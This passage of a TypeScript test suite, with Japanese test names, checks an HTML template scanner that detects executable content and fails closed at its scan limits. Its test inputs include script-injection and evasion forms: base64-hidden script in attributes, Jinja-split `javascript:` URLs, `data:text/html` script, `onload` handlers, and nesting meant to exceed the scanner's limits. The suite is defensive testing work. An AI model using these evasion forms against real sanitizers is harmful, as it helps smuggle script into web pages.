    expect(units(`<span data-opaque="">x</span>`)).toEqual([]);
    expect(units(`<span data-opaque=''>x</span>`)).toEqual([]);
    const enc = Buffer.from('<script>a()</script>').toString('base64');
    expect(units(`<span data-opaque='${enc}'>x</span>`)).toEqual(
      units(`<span data-opaque="${enc}">x</span>`),
    );
    expect(units(`<span data-opaque="${enc}">x</span>`).length).toBe(1);
  });

  it('本文末尾の `<`・閉じない doctype・閉じない引用符で止まらず、後続の script を落とさない', () => {
    expect(units('<p>x</p><')).toEqual([]);
    expect(units('<!doctype html')).toEqual([]);
    // 閉じない引用符は属性値がその後の全文字(<script> ごと)を飲み込む。飲まれた
    // <script> はタグとして走査されない = 単位にならない(実行もされないので安全側)。
    expect(units('<div title="unterminated><script>a()</script>')).toHaveLength(0);
    expect(units('<div title="ok"><script>a()</script>')).toHaveLength(1);
  });

  it('URL の scheme: mailto/tel は不活性、data は画像・フォント media だけ不活性、Jinja トークン混じりは strip して判定', () => {
    expect(units('<a href="mailto:a@b.example">x</a>')).toEqual([]);
    expect(units('<a href="data:image/png;base64,AAAA">x</a>')).toEqual([]);
    expect(units('<a href="data:text/html,<script>a()</script>">x</a>').length).toBe(1);
    expect(
      units('<a href="{% if x %}javascript:{% endif %}a()">x</a>').some((u) =>
        u.startsWith('url:'),
      ),
    ).toBe(true);
    // 値の中の Jinja はコメントでも固定する(`ur{# #}l(` のように綴りを割る形があるため)。
    expect(units('<a href="{# c #}#top">x</a>')).toEqual(['jinja-val:a.href|{# c #}']);
  });

  it('<style> の非不活性属性は単位に入る(media は不活性)', () => {
    expect(units('<style media="print">a{}</style>').some((u) => u.startsWith('attr:style.'))).toBe(
      false,
    );
    expect(
      units('<style onload="x()">a{}</style>').some((u) => u.startsWith('attr:style.onload=')),
    ).toBe(true);
  });
});

describe('走査の上限に達した入力は拒否側へ倒れる(fail closed)', () => {
  // 上限(チップ復号・<style> 再走査の深さ / 作業量予算)の先は走査されない。上限の先に
  // 何かを足しても単位列が変わらない形だと、基準と一致したまま照合を通ってしまう。
  // 印は許可リスト外の要素 1 つ(`<iframe>`)で足りる — 走査されれば必ず単位になる。
  const MARKER = '<iframe>';
  const chip = (inner: string) =>
    `<span data-opaque="${Buffer.from(inner).toString('base64')}">x</span>`;
  const nestChips = (inner: string, levels: number) => {
    let html = inner;
    for (let i = 0; i < levels; i++) html = chip(html);
    return html;
  };

  it('上限を超えて入れ子にしたチップの中身は、基準が空でも一致扱いにならない', () => {
    const nested = nestChips(MARKER, 8);
    expect(() => assertTemplateScriptsUnchanged('', nested, CTX)).toThrow();
  });

  it('上限を超えて入れ子にした閉じない <style> の中身も同様に拒否する', () => {
    const nested = `${'<style>'.repeat(8)}${MARKER}`;
    expect(() => assertTemplateScriptsUnchanged('', nested, CTX)).toThrow();
  });

  it('基準側も同じ上限に達していれば、上限の先の差分は照合できないので拒否する', () => {
    const base = nestChips('<b>x</b>', 8);
    const submitted = nestChips(`<b>x</b>${MARKER}`, 8);
    expect(() => assertTemplateScriptsUnchanged(base, submitted, CTX)).toThrow();
  });

  it('作業量予算が尽きた先に足した要素も、照合を素通りしない', () => {
    const prefix = `<div ${'{{ '.repeat(200_000)}>`;
    expect(() => assertTemplateScriptsUnchanged(prefix, `${prefix}${MARKER}`, CTX)).toThrow();
  });

  it('上限内の入れ子チップは従来どおり展開して照合する(誤検知しない)', () => {
    const nested = nestChips(MARKER, 3);
    expect(collectExecutableUnits(nested)).toEqual(['el:iframe||']);
    expect(() => assertTemplateScriptsUnchanged(nested, nested, CTX)).not.toThrow();
  });
});
